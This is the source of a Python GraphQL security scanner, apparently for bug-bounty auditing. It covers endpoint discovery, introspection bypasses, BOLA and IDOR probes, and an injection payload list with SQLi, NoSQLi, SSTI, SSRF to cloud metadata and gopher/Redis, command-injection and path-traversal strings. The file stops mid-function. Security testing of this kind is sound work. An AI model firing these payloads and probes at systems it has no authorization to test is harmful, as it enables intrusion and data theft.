#!/usr/bin/env python3
"""
auditing_tools/graphql_finder.py — GraphQL Security Auditor (v3)
═══════════════════════════════════════════════════════════════════════════════

TEN phases, hardened for production bug-bounty use:

  1. Endpoint discovery          POST + GET probing, 20+ paths
  2. Engine fingerprinting       graphw00f-style signatures
  3. Introspection               full dump + 6 bypass techniques
  4. Schema analysis             sensitive types/fields/mutations + BOLA surface
  5. Authorization testing       BOLA, BFLA, Relay node-ID, nested-object gaps
  6. Injection testing           SQLi/NoSQLi/SSTI/SSRF/cmd-injection (Query-rooted)
  7. Query abuse                 batching, aliases, depth-impact, negative-limit,
                                 directive flooding (CVE-2024-47614)
  8. CSRF / transport            GET mutations, text/plain bypass, CORS
  9. File upload                 multipart GraphQL spec surface detection
 10. WebSocket subscriptions     unauthenticated / expired-token subscription

v3 highlights (see change-log at bottom):
  • Every `.get(...).get(...)` chain hardened against `None`-valued keys
  • Introspection bypass responses validated before dict access
  • Injection / negative-limit / depth tests scoped to **root Query fields only**
  • Depth test actually traverses self-referential chains reachable from Query
  • All ten phases wrapped in per-phase fault isolation
  • Root Query / Mutation field extractors for correct test scoping
  • Consistent session teardown on exit

Config integration (config.py):
  • MODULE_RATE_LIMITS["graphql"]   → request pacing + concurrency
  • ACTIVE_HEADERS + AUTH_HEADERS   → merged into every request
  • AUTH_COOKIES                    → session cookies
  • SYNC_TO_DB, BRIDGE_*            → remote database sync
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import logging
import re
import sys
import time
import traceback
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed  # noqa: F401
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.graphql_finder")

# ═════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═════════════════════════════════════════════════════════════════════════════

try:
    import config as CFG
    CFG_LOADED = True
except ImportError:
    CFG = None
    CFG_LOADED = False

try:
    from db import DB
    DB_AVAILABLE = True
except ImportError:
    DB = None
    DB_AVAILABLE = False


def _cfg(key: str, default=None):
    if not CFG_LOADED:
        return default
    return getattr(CFG, key, default)


def _gql_settings() -> dict:
    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("graphql", {}) or {}
    return {
        "rate_limit":  entry.get("rate_limit", 2),
        "concurrency": entry.get("concurrency", 2),
        "timeout":     entry.get("timeout", 15),
    }


def _target_headers() -> dict[str, str]:
    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
        auth_hdrs = getattr(CFG, "AUTH_HEADERS", {}) or {}
        if auth_hdrs:
            h.update(auth_hdrs)
    return h


def _auth_cookies() -> dict[str, str]:
    if not CFG_LOADED or not getattr(CFG, "AUTH_ENABLED", False):
        return {}
    return dict(getattr(CFG, "AUTH_COOKIES", {}) or {})


# ═════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_THREADS      = 2
DEFAULT_RATE_LIMIT   = 2
DEFAULT_TIMEOUT      = 15
DEFAULT_RETRIES      = 1

GRAPHQL_PATHS = [
    "/graphql", "/graphiql", "/graphql.php", "/graphql/console",
    "/api/graphql", "/graphql/api", "/graphql/graphql", "/graphql/v1",
    "/query", "/gql", "/v1/graphql", "/v2/graphql", "/v3/graphql",
    "/api/v1/graphql", "/api/v2/graphql", "/index.php/graphql",
    "/playground", "/explorer", "/altair", "/graph",
]

INTROSPECTION_MAX_DEPTH   = 5
MAX_BATCH_SIZE            = 10
MAX_ALIAS_COUNT           = 10
MAX_DEPTH_PROBE           = 20
MAX_DIRECTIVE_FLOOD       = 1000
DEPTH_IMPACT_THRESHOLD    = 2.0

SENSITIVE_FIELD_PATTERNS = [
    "password", "passwd", "pwd", "secret", "token", "api_key", "apikey",
    "access_key", "private_key", "ssn", "social_security", "credit_card",
    "card_number", "cvv", "internal_notes", "internal_comment", "salary",
    "bank_account", "routing_number", "tax_id", "national_id",
    "refresh_token", "session_id", "otp", "mfa_secret",
]

SENSITIVE_TYPE_PATTERNS = [
    "admin", "internal", "private", "system", "audit", "billing",
    "payment", "credit", "invoice", "user", "account", "profile", "session",
]

SENSITIVE_MUTATION_PATTERNS = [
    "delete", "destroy", "remove", "admin", "reset", "revoke",
    "impersonate", "override", "escalate", "grant", "disable",
    "promote", "update", "create", "withdraw", "transfer",
]

ERROR_LEAK_PATTERNS = [
    r"stack\s*trace", r"at\s+\w+\.\w+\s*\(", r"SQLSTATE", r"mysql_",
    r"postgresql", r"ORA-\d+", r"at\s+Object\.<anonymous>",
    r"node_modules", r"\.java:\d+", r"\.py:\d+", r"\.rb:\d+",
    r"internal server error", r"debug mode", r"mongoerror",
]

INJECTION_PAYLOADS = {
    "sqli": [
        "'", "\"", "') OR ('1'='1", "') OR 1=1--",
        "1' AND SLEEP(3)--", "1' UNION SELECT NULL--",
        "\" OR \"\"=\"", "admin' OR '1'='1",
    ],
    "nosqli": [
        "{\"$ne\":null}", "{\"$gt\":\"\"}", "{\"$where\":\"sleep(3000)\"}",
        "{\"$regex\":\".*\"}", "';return true;var x='",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "*{7*7}",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80",
        "http://[::1]:80",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO",
    ],
    "cmd": [
        ";id", "|id", "$(id)", "`id`", "&& id", "|| id",
    ],
    "path_traversal": [
        "../../../etc/passwd", "....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
    ],
}

PII_MARKERS = [
    "root:x:0:0", "uid=0", "AccessKeyId", "SecretAccessKey",
    "ami-id", "instance-id", "internal", "password_hash",
]

# ═════════════════════════════════════════════════════════════════════════════
#  SAFE-GETTER HELPERS (v3 — the fix for the None-valued `.get(...)` bug)
# ═════════════════════════════════════════════════════════════════════════════

def _safe_list(obj: Any, key: str) -> list:
    """Return obj[key] if it's a list, else []."""
    if not isinstance(obj, dict):
        return []
    value = obj.get(key)
    return value if isinstance(value, list) else []


def _safe_dict(obj: Any, key: str) -> dict:
    """Return obj[key] if it's a dict, else {}."""
    if not isinstance(obj, dict):
        return {}
    value = obj.get(key)
    return value if isinstance(value, dict) else {}


def _safe_type_name(type_ref: Any) -> Optional[str]:
    """Extract 'name' from a GraphQL type-reference dict, tolerating None."""
    if not isinstance(type_ref, dict):
        return None
    name = type_ref.get("name")
    return name if isinstance(name, str) else None


def _schema_type_name(schema: Optional[dict], key: str) -> Optional[str]:
    """
    Safely read schema[key]['name'] (e.g. 'queryType', 'mutationType').

    The critical fix: `dict.get(key, {})` returns `None` when the key exists
    with value `None` (introspection sets mutationType/subscriptionType to
    null when absent). This helper returns `None` gracefully in that case.
    """
    if not isinstance(schema, dict):
        return None
    type_ref = schema.get(key)
    return _safe_type_name(type_ref)


def _root_query_fields(schema: Optional[dict]) -> list[dict]:
    """Return the field list of the root Query type (or [])."""
    if not schema:
        return []
    qname = _schema_type_name(schema, "queryType")
    if not qname:
        return []
    for t in _safe_list(schema, "types"):
        if t.get("name") == qname:
            return _safe_list(t, "fields")
    return []


def _root_mutation_fields(schema: Optional[dict]) -> list[dict]:
    """Return the field list of the root Mutation type (or [])."""
    if not schema:
        return []
    mname = _schema_type_name(schema, "mutationType")
    if not mname:
        return []
    for t in _safe_list(schema, "types"):
        if t.get("name") == mname:
            return _safe_list(t, "fields")
    return []


def _run_phase(label: str, fn: Callable[..., list], *args, **kwargs) -> list:
    """Run a phase function, isolating failures so one endpoint can't kill the audit."""
    try:
        return fn(*args, **kwargs) or []
    except Exception as e:
        log.warning(f"    Phase '{label}' failed: {e}")
        log.debug(traceback.format_exc())
        return []


# ═════════════════════════════════════════════════════════════════════════════
#  RATE-LIMITED SESSION
# ═════════════════════════════════════════════════════════════════════════════

class RateLimitedSession:
    def __init__(self, rate_limit: int = DEFAULT_RATE_LIMIT, timeout: int = DEFAULT_TIMEOUT):
        self.session = requests.Session()
        self.session.verify = False
        hdrs = _target_headers()
        if hdrs:
            self.session.headers.update(hdrs)
        if "User-Agent" not in self.session.headers:
            self.session.headers["User-Agent"] = "Argus-GraphQL-Auditor/3.0"
        for k, v in _auth_cookies().items():
            self.session.cookies.set(k, v)
        self.min_interval = 1.0 / rate_limit if rate_limit and rate_limit > 0 else 0.0
        self.timeout = timeout
        self._last = 0.0

    def __enter__(self):
        return self

    def __exit__(self, *exc_info):
        try:
            self.session.close()
        except Exception:
            pass

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        if self.min_interval > 0:
            elapsed = time.monotonic() - self._last
            if elapsed < self.min_interval:
                time.sleep(self.min_interval - elapsed)
        self._last = time.monotonic()
        try:
            return self.session.request(
                method, url,
                timeout=kwargs.pop("timeout", self.timeout),
                allow_redirects=kwargs.pop("allow_redirects", False),
                verify=False,
                **kwargs,
            )
        except requests.RequestException as e:
            log.debug(f"request failed: {method} {url}: {e}")
            return None

    def post_json(self, url: str, body: Any, headers: Optional[dict] = None) -> Optional[requests.Response]:
        hdrs = {"Content-Type": "application/json"}
        if headers:
            hdrs.update(headers)
        return self.request("POST", url, json=body, headers=hdrs)

    def post_raw(self, url: str, body: bytes, content_type: str, headers: Optional[dict] = None) -> Optional[requests.Response]:
        hdrs = {"Content-Type": content_type}
        if headers:
            hdrs.update(headers)
        return self.request("POST", url, data=body, headers=hdrs)

    def get(self, url: str, **kwargs):
        return self.request("GET", url, **kwargs)


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class GraphQLFinding:
    endpoint: str
    vuln_type: str
    category: str = "discovery"
    severity: str = "MEDIUM"
    confidence: int = 50
    engine: str = ""
    evidence: str = ""
    query_payload: str = ""
    response_snippet: str = ""
    details: dict = field(default_factory=dict)
    auth_enabled: bool = False
    first_seen: str = ""

    @property
    def finding_hash(self) -> str:
        return hashlib.sha256(f"{self.endpoint}|{self.vuln_type}".encode()).hexdigest()

    def to_dict(self) -> dict:
        return {
            "endpoint":         self.endpoint,
            "endpoint_host":    urllib.parse.urlparse(self.endpoint).hostname or "",
            "engine":           self.engine,
            "vuln_type":        self.vuln_type,
            "category":         self.category,
            "severity":         self.severity,
            "confidence":       self.confidence,
            "evidence":         self.evidence[:500],
            "query_payload":    self.query_payload[:1000],
            "response_snippet": self.response_snippet[:500],
            "details":          self.details,
            "auth_enabled":     self.auth_enabled,
            "finding_hash":     self.finding_hash,
            "first_seen":       self.first_seen,
        }


@dataclass
class GraphQLEndpoint:
    url: str
    engine: str = "unknown"
    introspectable: bool = False
    schema: Optional[dict] = None
    get_supported: bool = False
    text_plain_supported: bool = False
    multipart_supported: bool = False
    websocket_url: str = ""
    cors_reflects_creds: bool = False

    def to_dict(self) -> dict:
        return {
            "url":                   self.url,
            "engine":                self.engine,
            "introspectable":        self.introspectable,
            "has_schema":            self.schema is not None,
            "get_supported":         self.get_supported,
            "text_plain_supported":  self.text_plain_supported,
            "multipart_supported":   self.multipart_supported,
            "websocket_url":         self.websocket_url,
            "cors_reflects_creds":   self.cors_reflects_creds,
        }


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

def _load_urls(path: Path) -> list[str]:
    if not path.exists():
        return []
    urls, seen = [], set()
    for line in path.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        tok = line.split()[0]
        if not tok.startswith(("http://", "https://")):
            tok = "https://" + tok
        if tok not in seen:
            seen.add(tok)
            urls.append(tok)
    return urls


def _is_graphql_response(resp: requests.Response) -> bool:
    if resp.status_code >= 500:
        return False
    try:
        data = resp.json()
    except Exception:
        return False
    if not isinstance(data, dict):
        return False
    return "data" in data or "errors" in data


def _errors(resp: requests.Response) -> list[str]:
    try:
        data = resp.json()
    except Exception:
        return []
    errs = data.get("errors", []) if isinstance(data, dict) else []
    if not isinstance(errs, list):
        return []
    return [str(e.get("message", "")) for e in errs if isinstance(e, dict)]


def _body_text(resp: requests.Response, n: int = 500) -> str:
    try:
        return resp.text[:n].replace("\n", " ").strip()
    except Exception:
        return ""


def _extract_suggested_fields(error_msg: str) -> list[str]:
    m = re.search(r'Did you mean\s+(.+?)(?:\?|$)', error_msg, re.I)
    if not m:
        return []
    raw = m.group(1)
    return [s.strip().strip('"').strip("'") for s in re.split(r'[,]|or', raw) if s.strip()]


def _has_pii(text: str) -> tuple[bool, list[str]]:
    hits = [m for m in PII_MARKERS if m in text]
    return bool(hits), hits


def _b64_decode_safe(s: str) -> Optional[str]:
    try:
        padding = 4 - (len(s) % 4)
        if padding != 4:
            s += "=" * padding
        return base64.b64decode(s).decode("utf-8", errors="replace")
    except Exception:
        return None


def _b64_encode(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def _discover_ws_url(endpoint_url: str) -> str:
    parsed = urllib.parse.urlparse(endpoint_url)
    scheme = "wss" if parsed.scheme == "https" else "ws"
    path = parsed.path or "/graphql"
    return f"{scheme}://{parsed.netloc}{path}"


def _build_deep_query(schema: Optional[dict], depth: int) -> Optional[str]:
    """
    Build a deeply-nested query reachable from the root Query type.

    Two strategies, in order:
      A. A self-referential field directly on Query (`Query.foo → Query`)
      B. A Query field returning type T, where T has a self-referential field
    """
    if not schema:
        return None
    qname = _schema_type_name(schema, "queryType")
    if not qname:
        return None

    types_by_name = {
        t.get("name"): t
        for t in _safe_list(schema, "types")
        if isinstance(t, dict) and t.get("name")
    }
    query_type = types_by_name.get(qname)
    if not query_type:
        return None

    # Strategy A: direct self-ref on Query
    for f in _safe_list(query_type, "fields"):
        fname = f.get("name")
        ftype = _safe_type_name(f.get("type"))
        if fname and ftype == qname:
            inner = "__typename"
            for _ in range(depth):
                inner = f"{fname} {{ {inner} }}"
            return f"{{ {inner} }}"

    # Strategy B: one hop through a child type with a self-ref
    for qf in _safe_list(query_type, "fields"):
        qf_name = qf.get("name")
        qf_type = _safe_type_name(qf.get("type"))
        if not qf_name or not qf_type or qf_type == qname:
            continue
        child = types_by_name.get(qf_type)
        if not child:
            continue
        for cf in _safe_list(child, "fields"):
            cf_name = cf.get("name")
            cf_type = _safe_type_name(cf.get("type"))
            if cf_name and cf_type == qf_type:
                inner = "__typename"
                for _ in range(max(1, depth - 1)):
                    inner = f"{cf_name} {{ {inner} }}"
                return f"{{ {qf_name} {{ {inner} }} }}"
    return None


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — ENDPOINT DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

DISCOVERY_QUERY = "{__typename}"
DISCOVERY_BODY = {"query": DISCOVERY_QUERY, "operationName": "probe"}


def discover_graphql_endpoints(
    session: RateLimitedSession, base_urls: list[str],
) -> list[GraphQLEndpoint]:
    endpoints: list[GraphQLEndpoint] = []
    seen: set[str] = set()

    hosts: set[str] = set()
    for url in base_urls:
        p = urllib.parse.urlparse(url)
        if p.hostname:
            hosts.add(f"{p.scheme}://{p.netloc}")

    log.info(f"    Probing {len(hosts)} host(s) × {len(GRAPHQL_PATHS)} path(s)")

    for host in sorted(hosts):
        for path in GRAPHQL_PATHS:
            test_url = host.rstrip("/") + path
            if test_url in seen:
                continue
            seen.add(test_url)

            resp = session.post_json(test_url, DISCOVERY_BODY)
            if not resp or not _is_graphql_response(resp):
                continue

            ep = GraphQLEndpoint(url=test_url)

            get_resp = session.get(test_url, params={"query": DISCOVERY_QUERY})
            if get_resp and _is_graphql_response(get_resp):
                ep.get_supported = True

            try:
                tp_resp = session.post_raw(
                    test_url,
                    json.dumps(DISCOVERY_BODY).encode(),
                    "text/plain",
                )
                if tp_resp and _is_graphql_response(tp_resp):
                    ep.text_plain_supported = True
            except Exception:
                pass

            ep.websocket_url = _discover_ws_url(test_url)
            endpoints.append(ep)
            log.info(f"      FOUND {test_url}")

    return endpoints


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — ENGINE FINGERPRINTING
# ═════════════════════════════════════════════════════════════════════════════

def fingerprint_engine(session: RateLimitedSession, ep: GraphQLEndpoint) -> str:
    try:
        resp = session.post_raw(ep.url, b'{"query":"{__typename"}', "application/json")
    except Exception:
        return "unknown"
    if not resp:
        return "unknown"

    body = (resp.text or "").lower()
    headers_str = str(resp.headers).lower()

    sigs = [
        ("Apollo",           ["apollo", "graphql/apollo"]),
        ("graphql-yoga",     ["graphql-yoga", "yoga"]),
        ("Hasura",           ["hasura", "x-hasura"]),
        ("Graphene",         ["graphene"]),
        ("Ariadne",          ["ariadne"]),
        ("express-graphql",  ["express-graphql"]),
        ("graphql-js",       ["graphql-js", "graphql.js"]),
        ("Absinthe",         ["absinthe"]),
        ("Juniper",          ["juniper"]),
        ("Sangria",          ["sangria"]),
        ("Hot Chocolate",    ["hot chocolate", "hotchocolate"]),
        ("AWS AppSync",      ["appsync"]),
        ("Shopify",          ["shopify"]),
    ]
    for name, needles in sigs:
        for n in needles:
            if n in body or n in headers_str:
                return name
    return "unknown"


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — INTROSPECTION
# ═════════════════════════════════════════════════════════════════════════════

INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description
    args { name description type { ...TypeRef } }
    type { ...TypeRef }
  }
  inputFields { name description type { ...TypeRef } }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description }
  possibleTypes { ...TypeRef }
}
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
}
"""


def run_introspection(session: RateLimitedSession, ep: GraphQLEndpoint) -> Optional[dict]:
    resp = session.post_json(
        ep.url,
        {"query": INTROSPECTION_QUERY, "operationName": "IntrospectionQuery"},
    )
    if not resp:
        return None
    try:
        data = resp.json()
    except Exception:
        return None
    if not isinstance(data, dict):
        return None
    if not data.get("data"):
        return None
    schema = _safe_dict(data.get("data"), "__schema")
    if schema and isinstance(schema.get("types"), list) and schema["types"]:
        ep.introspectable = True
        ep.schema = schema
        return schema
    return None


def bypass_introspection(
    session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool,
) -> list[GraphQLFinding]:
    findings: list[GraphQLFinding] = []
    now = datetime.now(timezone.utc).isoformat()

    # ── Technique 1: __type fallback ────────────────────────────────────────
    type_query = '{"query":"{ __type(name: \\"Query\\") { name fields { name } } }"}'
    resp = session.post_raw(ep.url, type_query.encode(), "application/json")
    if resp and _is_graphql_response(resp):
        try:
            data = resp.json()
            if _safe_dict(data.get("data"), "__type"):
                findings.append(GraphQLFinding(
                    endpoint=ep.url, vuln_type="graphql_introspection_type_fallback",
                    category="introspection", severity="MEDIUM", confidence=80,
                    engine=ep.engine,
                    evidence='__schema blocked but __type(name: "Query") succeeds',
                    query_payload=type_query,
                    response_snippet=_body_text(resp),
                    auth_enabled=auth_on, first_seen=now,
                ))
        except Exception:
            pass

    # ── Technique 2: newline / whitespace bypass ────────────────────────────
    for sep in ("\n", "\t", "\r\n", "  "):
        q = f'{{ __schema{sep}{{ types{{ name }} }} }}'
        r = session.post_json(ep.url, {"query": q})
        if r and _is_graphql_response(r):
            try:
                data = r.json()
                if _safe_dict(data.get("data"), "__schema"):
                    findings.append(GraphQLFinding(
                        endpoint=ep.url, vuln_type="graphql_introspection_newline_bypass",
                        category="introspection", severity="HIGH", confidence=85,
                        engine=ep.engine,
                        evidence=f"__schema newline-bypass ({sep!r}) reaches introspection",
                        query_payload=q,
                        response_snippet=_body_text(r),
                        auth_enabled=auth_on, first_seen=now,
                    ))
                    break
            except Exception:
                pass

    # ── Technique 3: field-suggestion oracle ────────────────────────────────
    suggestions: set[str] = set()
    for fake in ("aaa", "zzz", "qqq", "nonexistent"):
        q = f'{{ {fake} }}'
        r = session.post_json(ep.url, {"query": q})
        if not r:
            continue
        for msg in _errors(r):
            suggestions.update(_extract_suggested_fields(msg))

    if suggestions:
        findings.append(GraphQLFinding(
            endpoint=ep.url, vuln_type="graphql_field_suggestion_leak",
            category="introspection", severity="MEDIUM", confidence=85,
            engine=ep.engine,
            evidence=f"Field suggestions leaked: {', '.join(sorted(suggestions)[:15])}",
            details={"suggested_fields": sorted(suggestions)[:100]},
            auth_enabled=auth_on, first_seen=now,
        ))

    # ── Technique 4: root-field enumeration via aliasing ────────────────────
    candidate_fields = list(suggestions) + [
        "user", "users", "me", "viewer", "admin", "account",
        "node", "nodes", "posts", "comments", "search",
        "config", "settings", "health", "version", "info",
    ]
    # Sanitize: GraphQL names must match /^[_A-Za-z][_0-9A-Za-z]*$/
    candidate_fields = [
        f for f in candidate_fields
        if isinstance(f, str) and re.fullmatch(r"[_A-Za-z][_0-9A-Za-z]*", f)
    ]
    if candidate_fields:
        probe = "{ " + " ".join(f'{f}: __typename' for f in candidate_fields) + " }"
        r = session.post_json(ep.url, {"query": probe})
        if r and _is_graphql_response(r):
            try:
                data_obj = _safe_dict(r.json(), "data")
                found = [k for k, v in data_obj.items() if v is not None]
                if found:
                    findings.append(GraphQLFinding(
                        endpoint=ep.url, vuln_type="graphql_root_field_enumeration",
                        category="introspection", severity="MEDIUM", confidence=70,
                        engine=ep.engine,
                        evidence=f"Root fields discovered via aliasing: {', '.join(found[:15])}",
                        query_payload=probe,
                        details={"root_fields": found[:50]},
                        auth_enabled=auth_on, first_seen=now,
                    ))
            except Exception:
                pass

    return findings


def analyze_schema(
    ep: GraphQLEndpoint, schema: dict, auth_on: bool,
) -> list[GraphQLFinding]:
    """
    Inspect the introspected schema for sensitive types, sensitive fields,
    admin-like mutations, and BOLA-suspect arguments.

    v3 fix: uses `_schema_type_name(schema, "mutationType")` instead of the
    buggy `schema.get("mutationType", {}).get("name")` which crashed when the
    endpoint returned `"mutationType": null` (no mutations defined).
    """
    findings: list[GraphQLFinding] = []
    now = datetime.now(timezone.utc).isoformat()

    types = _safe_list(schema, "types")
    sensitive_types: list[str] = []
    sensitive_fields: list[dict] = []
    sensitive_mutations: list[dict] = []
    bola_args: list[dict] = []

    mutation_type_name = _schema_type_name(schema, "mutationType")  # ← the fix

    for t in types:
        if not isinstance(t, dict):
            continue
        tname = t.get("name") or ""
        if not tname or tname.startswith("__"):
            continue

        if any(pat in tname.lower() for pat in SENSITIVE_TYPE_PATTERNS):
            sensitive_types.append(tname)

        for f in _safe_list(t, "fields"):
            if not isinstance(f, dict):
                continue
            fname = (f.get("name") or "").lower()
            if any(pat in fname for pat in SENSITIVE_FIELD_PATTERNS):
                sensitive_fields.append({
                    "type":  tname,
                    "field": f.get("name"),
                    "args":  [a.get("name") for a in _safe_list(f, "args") if isinstance(a, dict)],
                })
            for arg in _safe_list(f, "args"):
                if not isinstance(arg, dict):
                    continue
                aname = (arg.get("name") or "").lower()
                if aname in ("id", "uuid", "user_id", "userid", "account_id",
                             "email", "username", "tenant_id", "nodeid"):
                    bola_args.append({
                        "type":  tname,
                        "field": f.get("name"),
                        "arg":   arg.get("name"),
                    })

    # Mutations — only if the schema actually declares a mutationType
    if mutation_type_name:
        for t in types:
            if not isinstance(t, dict) or t.get("name") != mutation_type_name:
                continue
            for f in _safe_list(t, "fields"):
                if not isinstance(f, dict):
                    continue
                fname = (f.get("name") or "").lower()
                if any(pat in fname for pat in SENSITIVE_MUTATION_PATTERNS):
                    sensitive_mutations.append({
                        "mutation": f.get("name"),
                        "args": [a.get("name") for a in _safe_list(f, "args") if isinstance(a, dict)],
                    })

    if sensitive_types:
        findings.append(GraphQLFinding(
            endpoint=ep.url, vuln_type="graphql_sensitive_types",
            category="introspection", severity="LOW", confidence=70,
            engine=ep.engine,
            evidence=f"Sensitive types: {', '.join(sensitive_types[:10])}",
            details={"types": sensitive_types[:50]},
            auth_enabled=auth_on, first_seen=now,
        ))

    if sensitive_fields:
        findings.append(GraphQLFinding(
            endpoint=ep.url, vuln_type="graphql_sensitive_fields",
            category="introspection", severity="MEDIUM", confidence=80,
            engine=ep.engine,
            evidence="Sensitive fields: " + ", ".join(
                f"{f['type']}.{f['field']}" for f in sensitive_fields[:10]
            ),
            details={"fields": sensitive_fields[:100]},
            auth_enabled=auth_on, first_seen=now,
        ))

    if sensitive_mutations:
        findings.append(GraphQLFinding(
            endpoint=ep.url, vuln_type="graphql_sensitive_mutations",
            category="introspection", severity="MEDIUM", confidence=75,
            engine=ep.engine,
            evidence=f"Admin-like mutations: {', '.join(m['mutation'] for m in sensitive_mutations[:10])}",
            details={"mutations": sensitive_mutations[:50]},
            auth_enabled=auth_on, first_seen=now,
        ))

    if bola_args:
        findings.append(GraphQLFinding(
            endpoint=ep.url, vuln_type="graphql_bola_surface",
            category="authz", severity="HIGH", confidence=65,
            engine=ep.engine,
            evidence=f"{len(bola_args)} field(s) accept id-like args (BOLA surface)",
            details={"bola_args": bola_args[:100]},
            auth_enabled=auth_on, first_seen=now,
        ))

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — AUTHORIZATION (BOLA / BFLA / Relay / Nested)
# ═════════════════════════════════════════════════════════════════════════════

def test_bola(
    session: RateLimitedSession, ep: GraphQLEndpoint,
    user_a_cookie: Optional[str], user_b_id: Optional[str], auth_on: bool,
) -> list[GraphQLFinding]:
    findings: list[GraphQLFinding] = []
    if not ep.schema:
        return findings
    now = datetime.now(timezone.utc).isoformat()

    # Only fields on the root Query type can be probed directly
    root_fields = _root_query_fields(ep.schema)
    bola_fields: list[dict] = []
    for f in root_fields:
        if not isinstance(f, dict):
            continue
        for arg in _safe_list(f, "args"):
            if not isinstance(arg, dict):
                continue
            aname = (arg.get("name") or "").lower()
            if aname in ("id", "uuid", "user_id", "account_id", "email", "nodeid"):
                bola_fields.append({
                    "type": "Query",
                    "field": f.get("name"),
                    "arg":   arg.get("name"),
                })

    if not bola_fields:
        return findings

    if user_a_cookie and user_b_id:
        headers = {"Cookie": user_a_cookie}
        for bf in bola_fields[:10]:
            q = f'{{ {bf["field"]}({bf["arg"]}: "{user_b_id}") {{ __typename }} }}'
            r = session.post_json(ep.url, {"query": q}, headers=headers)
            if r and _is_graphql_response(r):
                try:
                    data = r.json()
                    if _safe_dict(data, "data"):
                        findings.append(GraphQLFinding(
                            endpoint=ep.url, vuln_type="graphql_bola_confirmed",
                            category="authz", severity="CRITICAL", confidence=85,
                            engine=ep.engine,
                            evidence=f"Query {bf['field']}({bf['arg']}={user_b_id}) returned data with User A session",
                            query_payload=q,
                            response_snippet=_body_text(r, 300),
                            details=bf,
                            auth_enabled=auth_on, first_seen=now,
                        ))
                except Exception:
                    pass
    else:
        findings.append(GraphQLFinding(
            endpoint=ep.url, vuln_type="graphql_bola_surface",
            category="authz", severity="HIGH", confidence=55,
            engine=ep.engine,
            evidence=f"{len(bola_fields)} root Query field(s) accept id-like args; supply dual sessions to confirm",
            details={"bola_fields": bola_fields[:50]},
            auth_enabled=auth_on, first_seen=now,
        ))

    return findings


def test_relay_node_idor(
    session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool,
) -> list[GraphQLFinding]:
    findings: list[GraphQLFinding] = []
    if not ep.schema:
        return findings
    now = datetime.now(timezone.utc).isoformat()

    has_node = any(
        (f.get("name") or "").lower() == "node"
        for f in _root_query_fields(ep.schema)
        if isinstance(f, dict)
    )
    if not has_node:
        return findings

    test_id = _b64_encode("User:1")
    q = f'{{ node(id: "{test_id}") {{ __typename }} }}'
    r = session.post_json(ep.url, {"query": q})
    if r and _is_graphql_response(r):
        try:
            data = r.json()
            if _safe_dict(data.get("data"), "node"):
                findings.append(GraphQLFinding(
                    endpoint=ep.url, vuln_type="graphql_relay_node_idor_surface",
                    category="authz", severity="HIGH", confidence=70,
                    engine=ep.engine,
                    evidence="Relay node interface accepts base64-encoded Type:ID — enumerate for IDOR",
                    query_payload=q,
                    response_snippet=_body_text(r, 300),
                    details={
                        "decoded_id": "User:1",
                        "test_queries": [
                            f'{{ node(id: "{_b64_encode("User:2")}") {{ __typename }} }}',
                            f'{{ node(id: "{_b64_encode("User:3")}") {{ __typename }} }}',
                        ],
                    },
                    auth_enabled=auth_on, first_seen=now,
                ))
        except Exception:
            pass

    return findings


def test_nested_object_authz(
    session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool,
) -> list[GraphQLFinding]:
    findings: list[GraphQLFinding] = []
    if not ep.schema:
        return findings
    now = datetime.now(timezone.utc).isoformat()

    gaps: list[dict] = []
    for t in _safe_list(ep.schema, "types"):
        if not isinstance(t, dict):
            continue
        tname = t.get("name") or ""
        if not any(pat in tname.lower() for pat in SENSITIVE_TYPE_PATTERNS):
            continue
        for f in _safe_list(t, "fields"):
            if not isinstance(f, dict):
                continue
            ftype_name = _safe_type_name(f.get("type")) or ""
            if any(pat in ftype_name.lower() for pat in SENSITIVE_TYPE_PATTERNS):
                gaps.append({
                    "parent_type": tname,
                    "field":       f.get("name"),
                    "child_type":  ftype_name,
                })

    if gaps:
        findings.append(GraphQLFinding(
            endpoint=ep.url, vuln_type="graphql_nested_authz_surface",
            category="authz", severity="MEDIUM", confidence=45,
            engine=ep.engine,
            evidence=f"{len(gaps)} sensitive nested relationship(s) — test ownership inheritance manually",
            details={"gaps": gaps[:50]},
            auth_enabled=auth_on, first_seen=now,
        ))

    return findings


def test_bfla(
    session: RateLimitedSession, ep: GraphQLEndpoint,
    user_cookie: Optional[str], auth_on: bool,
) -> list[GraphQLFinding]:
    findings: list[GraphQLFinding] = []
    if not ep.schema:
        return findings
    now = datetime.now(timezone.utc).isoformat()

